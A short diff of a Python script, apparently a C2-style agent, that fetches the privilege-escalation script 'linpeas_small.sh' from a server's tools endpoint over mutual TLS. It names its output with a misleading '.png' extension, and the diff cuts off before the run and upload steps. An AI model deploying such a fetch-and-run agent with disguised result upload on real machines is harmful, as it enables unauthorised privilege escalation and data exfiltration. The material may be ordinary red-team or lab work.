@@ -2,11 +2,13 @@ import requests
 import subprocess
 import os
 from pathlib import Path
-SERVER_URL = "https://localhost"
+from datetime import datetime
+SERVER_URL = "https://127.0.0.1"
 UPLOAD_ENDPOINT = "/upload"
 TOOLS_ENDPOINT = "/tools"
 filename = "linpeas_small.sh"
-output = "output.txt"
+now = datetime.now()
+output = "Privesc_output" + now.strftime("%Y-%m-%d_%H-%M-%S") + ".png"
 BASE_DIR = Path.cwd()
 CLIENT_CRT = BASE_DIR / "keys" / "agent1.crt"
 CLIENT_KEY = BASE_DIR / "keys" / "agent1.key"
@@ -14,7 +16,7 @@ CA_CERT = BASE_DIR / "keys" / "ca.crt"
 
 def run():
     try:
-        response = requests.get(SERVER_URL +TOOLS_ENDPOINT +f"/{filename}")
+        response = requests.get(SERVER_URL +TOOLS_ENDPOINT +f"/{filename}",cert=(CLIENT_CRT, CLIENT_KEY),verify=CA_CERT)
 
         if response.status_code == 200:
             # 1. Save the initial file
